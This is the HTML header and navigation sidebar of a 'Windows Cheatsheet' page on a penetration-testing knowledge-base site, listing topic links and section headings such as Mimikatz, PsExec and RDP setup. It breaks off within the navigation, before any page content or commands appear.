



<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="Copy to clipboard">
      
        <meta name="lang:clipboard.copied" content="Copied to clipboard">
      
        <meta name="lang:search.language" content="en">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="No matching documents">
      
        <meta name="lang:search.result.one" content="1 matching document">
      
        <meta name="lang:search.result.other" content="# matching documents">
      
        <meta name="lang:search.tokenizer" content="[\s\-]+">
      
      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
    
    
      
        <title>Cheatsheet - Security Knowledge Base</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/application.1b62728e.css">
      
      
    
    
      <script src="../../../assets/javascripts/modernizr.268332fc.js"></script>
    
    
      
        <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
        <style>body,input{font-family:"Roboto","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Roboto Mono","Courier New",Courier,monospace}</style>
      
    
    <link rel="stylesheet" href="../../../assets/fonts/material-icons.css">
    
    
      <link rel="stylesheet" href="../../../_site/extra.css">
    
    
      
    
    
  </head>
  
    <body dir="ltr">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" data-md-component="overlay" for="__drawer"></label>
    
      <a href="#cheatsheet" tabindex="1" class="md-skip">
        Skip to content
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="../../.." title="Security Knowledge Base" class="md-header-nav__button md-logo">
          
            <i class="md-icon"></i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="__drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            <span class="md-header-nav__topic">
              Security Knowledge Base
            </span>
            <span class="md-header-nav__topic">
              
                Cheatsheet
              
            </span>
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          <label class="md-icon md-icon--search md-header-nav__button" for="__search"></label>
          
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="__search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            Type to start searching
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
      <main class="md-main" role="main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="__drawer">
    <a href="../../.." title="Security Knowledge Base" class="md-nav__button md-logo">
      
        <i class="md-icon"></i>
      
    </a>
    Security Knowledge Base
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item">
    <a href="../../.." title="Home" class="md-nav__link">
      Home
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../bug-hunting/" title="Bug hunting" class="md-nav__link">
      Bug hunting
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../career/" title="Career" class="md-nav__link">
      Career
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../container/" title="Container" class="md-nav__link">
      Container
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../crypto/" title="Crypto" class="md-nav__link">
      Crypto
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../databases-sqlserver/" title="Databases sqlserver" class="md-nav__link">
      Databases sqlserver
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../databases/" title="Databases" class="md-nav__link">
      Databases
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../dfir/" title="Dfir" class="md-nav__link">
      Dfir
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../embedded-and-iot/" title="Embedded and iot" class="md-nav__link">
      Embedded and iot
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../exploits_and_shellcoding/" title="Exploits and shellcoding" class="md-nav__link">
      Exploits and shellcoding
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../languages/" title="Languages" class="md-nav__link">
      Languages
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../linux-issues/" title="Linux issues" class="md-nav__link">
      Linux issues
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../linux/" title="Linux" class="md-nav__link">
      Linux
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../malware/" title="Malware" class="md-nav__link">
      Malware
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../operating-systems/" title="Operating systems" class="md-nav__link">
      Operating systems
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../osint/" title="Osint" class="md-nav__link">
      Osint
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../password-attacks/" title="Password attacks" class="md-nav__link">
      Password attacks
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../reverse-engineering/" title="Reverse engineering" class="md-nav__link">
      Reverse engineering
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../rf-and-sdr/" title="Rf and sdr" class="md-nav__link">
      Rf and sdr
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../steganography/" title="Steganography" class="md-nav__link">
      Steganography
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../vulnerable/" title="Vulnerable" class="md-nav__link">
      Vulnerable
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../wifi/" title="Wifi" class="md-nav__link">
      Wifi
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../windows-active-directory/" title="Windows active directory" class="md-nav__link">
      Windows active directory
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../windows-issues/" title="Windows issues" class="md-nav__link">
      Windows issues
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item">
    <a href="../../../windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-29" type="checkbox" id="nav-29">
    
    <label class="md-nav__link" for="nav-29">
      Certifications
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-29">
        Certifications
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/cissp/" title="Cissp" class="md-nav__link">
      Cissp
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/osce/" title="Osce" class="md-nav__link">
      Osce
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-29-3" type="checkbox" id="nav-29-3">
    
    <label class="md-nav__link" for="nav-29-3">
      Oscp
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-29-3">
        Oscp
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/0-cheatsheet/" title="Enumeration" class="md-nav__link">
      Enumeration
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/_collections/" title="collections" class="md-nav__link">
       collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/_preparation/" title="Was checking" class="md-nav__link">
      Was checking
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/lab-setup/" title="Lab Setup" class="md-nav__link">
      Lab Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/notes/" title="Notes" class="md-nav__link">
      Notes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/practice-vulnhub/" title="Practice" class="md-nav__link">
      Practice
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/setup/" title="Setup" class="md-nav__link">
      Setup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-29-3-9" type="checkbox" id="nav-29-3-9">
    
    <label class="md-nav__link" for="nav-29-3-9">
      Cheatsheet
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-29-3-9">
        Cheatsheet
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/0-cheatsheet/" title="Cheatsheets" class="md-nav__link">
      Cheatsheets
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/download/" title="Download" class="md-nav__link">
      Download
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/exploits/" title="Exploits" class="md-nav__link">
      Exploits
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/share-files/" title="Share files" class="md-nav__link">
      Share files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/shell/" title="Bash" class="md-nav__link">
      Bash
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/tty/" title="TTY" class="md-nav__link">
      TTY
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/web/" title="Web" class="md-nav__link">
      Web
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/windows/" title="Windows" class="md-nav__link">
      Windows
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-29-3-9-10" type="checkbox" id="nav-29-3-9-10">
    
    <label class="md-nav__link" for="nav-29-3-9-10">
      Enumeration
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
      <label class="md-nav__title" for="nav-29-3-9-10">
        Enumeration
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/enumeration/network/" title="Network" class="md-nav__link">
      Network
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/enumeration/vulnerability/" title="Vulnerability" class="md-nav__link">
      Vulnerability
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../certifications/oscp/cheatsheet/enumeration/windows-local/" title="Windows local" class="md-nav__link">
      Windows local
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-30" type="checkbox" id="nav-30">
    
    <label class="md-nav__link" for="nav-30">
      Cloud
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-30">
        Cloud
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../cloud/aws/" title="Aws" class="md-nav__link">
      Aws
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../cloud/azuer/" title="Azuer" class="md-nav__link">
      Azuer
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-31" type="checkbox" id="nav-31">
    
    <label class="md-nav__link" for="nav-31">
      Identity and access management
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-31">
        Identity and access management
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../identity-and-access-management/jwt/" title="Jwt" class="md-nav__link">
      Jwt
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../identity-and-access-management/kerberos/" title="Kerberos" class="md-nav__link">
      Kerberos
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../identity-and-access-management/oauth2-and-oidc/" title="Oauth2 and oidc" class="md-nav__link">
      Oauth2 and oidc
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-32" type="checkbox" id="nav-32">
    
    <label class="md-nav__link" for="nav-32">
      Network
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-32">
        Network
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../network/port-forwarding-and-tunneling/" title="Port Forwarding" class="md-nav__link">
      Port Forwarding
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../network/traffic-analysis/" title="Traffic analysis" class="md-nav__link">
      Traffic analysis
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../network/wireless/" title="Wireless" class="md-nav__link">
      Wireless
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../network/y-Tools/" title="y Tools" class="md-nav__link">
      y Tools
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-33" type="checkbox" id="nav-33" checked>
    
    <label class="md-nav__link" for="nav-33">
      Os
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-33">
        Os
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-33-1" type="checkbox" id="nav-33-1" checked>
    
    <label class="md-nav__link" for="nav-33-1">
      Windows
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-33-1">
        Windows
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
    
      
    
    
      <label class="md-nav__link md-nav__link--active" for="__toc">
        Cheatsheet
      </label>
    
    <a href="./" title="Cheatsheet" class="md-nav__link md-nav__link--active">
      Cheatsheet
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
    
  
  
    <label class="md-nav__title" for="__toc">Table of contents</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#versions" class="md-nav__link">
    Versions
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#user-accounts" class="md-nav__link">
    User accounts
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#mimikatz" class="md-nav__link">
    Mimikatz
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#psexec" class="md-nav__link">
    PsExec
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#open-password-protected-share" class="md-nav__link">
    Open password protected share
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#convert-string-to-little-endian" class="md-nav__link">
    Convert string to little-endian
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#recon" class="md-nav__link">
    Recon
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#domain-network-recon" class="md-nav__link">
    Domain Network Recon
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#moving-files" class="md-nav__link">
    Moving files
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#extract-zip" class="md-nav__link">
    Extract ZIP
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#view-file-systems" class="md-nav__link">
    View File Systems
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#access-shared-volume" class="md-nav__link">
    Access shared volume
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#invoke-command-with-credentials" class="md-nav__link">
    Invoke command with credentials
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#alternate-data-stream" class="md-nav__link">
    Alternate Data Stream
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#msi" class="md-nav__link">
    MSI
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#installing-msi" class="md-nav__link">
    Installing MSI
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#services" class="md-nav__link">
    Services
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#auto-sc-config-servicename-start-auto" class="md-nav__link">
    Auto: sc config servicename start= auto
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#keep-alive" class="md-nav__link">
    Keep alive
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#auto-save-password-to-powershell" class="md-nav__link">
    Auto Save Password to PowerShell
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#permissions" class="md-nav__link">
    Permissions
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#view-permisions" class="md-nav__link">
    View Permisions
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#grant-permissions" class="md-nav__link">
    Grant Permissions
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ssh-from-windows-to-attacker-kali" class="md-nav__link">
    SSH from Windows to Attacker (Kali)
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#manual" class="md-nav__link">
    Manual
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#metasploit" class="md-nav__link">
    Metasploit
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#enumeration-tips" class="md-nav__link">
    Enumeration Tips
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#add-user-and-enable-rdp" class="md-nav__link">
    Add user and enable RDP
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../active-directory/" title="Active Directory" class="md-nav__link">
      Active Directory
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../api/" title="Windows API" class="md-nav__link">
      Windows API
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../applocker/" title="Applocker" class="md-nav__link">
      Applocker
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../events/" title="Events" class="md-nav__link">
      Events
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../hyperv/" title="HyperV" class="md-nav__link">
      HyperV
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../important-endpoints/" title="Important Endpoints" class="md-nav__link">
      Important Endpoints
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../important-files/" title="Important Files" class="md-nav__link">
      Important Files
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../important-issues/" title="Important issues" class="md-nav__link">
      Important issues
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../important-processes/" title="Important Processes" class="md-nav__link">
      Important Processes
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../important-reg-locations/" title="Important Registry Locations" class="md-nav__link">
      Important Registry Locations
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../kernel-exploitation/" title="Kernel Exploitation" class="md-nav__link">
      Kernel Exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../mix/" title="Mix" class="md-nav__link">
      Mix
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../post-exploitation/" title="Post exploitation" class="md-nav__link">
      Post exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../privilege-escalation/" title="Privilege Escalation" class="md-nav__link">
      Privilege Escalation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../user-accounts/" title="User accounts" class="md-nav__link">
      User accounts
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../wmi/" title="Wmi" class="md-nav__link">
      Wmi
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../x-Bypass/" title="Defense Bypass" class="md-nav__link">
      Defense Bypass
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../x-Defense/" title="Defense" class="md-nav__link">
      Defense
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../y-Tools/" title="Tools" class="md-nav__link">
      Tools
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../z-References/" title="References" class="md-nav__link">
      References
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-33-1-22" type="checkbox" id="nav-33-1-22">
    
    <label class="md-nav__link" for="nav-33-1-22">
      Credentials
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-33-1-22">
        Credentials
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../credentials/0-cheatsheed/" title="Cheatsheet" class="md-nav__link">
      Cheatsheet
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../credentials/using-credentials/" title="Using Credentials" class="md-nav__link">
      Using Credentials
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-33-1-23" type="checkbox" id="nav-33-1-23">
    
    <label class="md-nav__link" for="nav-33-1-23">
      Powershell
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
      <label class="md-nav__title" for="nav-33-1-23">
        Powershell
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../powershell/0-cheatsheet/" title="Cheatsheet" class="md-nav__link">
      Cheatsheet
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../powershell/collections/" title="Collections" class="md-nav__link">
      Collections
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../powershell/modules/" title="Modules" class="md-nav__link">
      Modules
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../powershell/powershell/" title="Reverse Shell" class="md-nav__link">
      Reverse Shell
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../powershell/z-Resources/" title="Resources" class="md-nav__link">
      Resources
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-34" type="checkbox" id="nav-34">
    
    <label class="md-nav__link" for="nav-34">
      Protocols and ports
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-34">
        Protocols and ports
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/Citrix-1494/" title="Citrix 1494" class="md-nav__link">
      Citrix 1494
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/DHCP/" title="DHCP" class="md-nav__link">
      DHCP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/DNS-53/" title="DNS 53" class="md-nav__link">
      DNS 53
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/ElasticSearch-9200/" title="Interesting APIs" class="md-nav__link">
      Interesting APIs
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/FTP-21/" title="FTP 21" class="md-nav__link">
      FTP 21
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/Finger-79/" title="Finger 79" class="md-nav__link">
      Finger 79
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/HTTP-HTTPS-80,443/" title="HTTP HTTPS 80,443" class="md-nav__link">
      HTTP HTTPS 80,443
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/IMAP-143,993/" title="References" class="md-nav__link">
      References
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/IRC-8067/" title="IRC 8067" class="md-nav__link">
      IRC 8067
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/LDAP-389/" title="LDAP 389" class="md-nav__link">
      LDAP 389
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/Memcache/" title="Memcache" class="md-nav__link">
      Memcache
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/Modbus-502/" title="Modbus 502" class="md-nav__link">
      Modbus 502
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/MySQL-3306/" title="MySQL 3306" class="md-nav__link">
      MySQL 3306
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/NFS-2049/" title="NFS 2049" class="md-nav__link">
      NFS 2049
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/NTP-123/" title="NTP 123" class="md-nav__link">
      NTP 123
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/Oracle-1521/" title="References" class="md-nav__link">
      References
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/POP3-110/" title="POP3 110" class="md-nav__link">
      POP3 110
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/PPTP-L2TP-VPN-500,1723/" title="PPTP L2TP VPN 500,1723" class="md-nav__link">
      PPTP L2TP VPN 500,1723
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/Portmapper-111/" title="Portmapper 111" class="md-nav__link">
      Portmapper 111
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/RDP-3389/" title="RDP 3389" class="md-nav__link">
      RDP 3389
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/RPC-135,445/" title="RPC 135,445" class="md-nav__link">
      RPC 135,445
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../../protocols-and-ports/SIP-5060/" title="SIP 5060" class="md-nav__link">
      SIP 5060
    </a>
  </li>

        
          
          
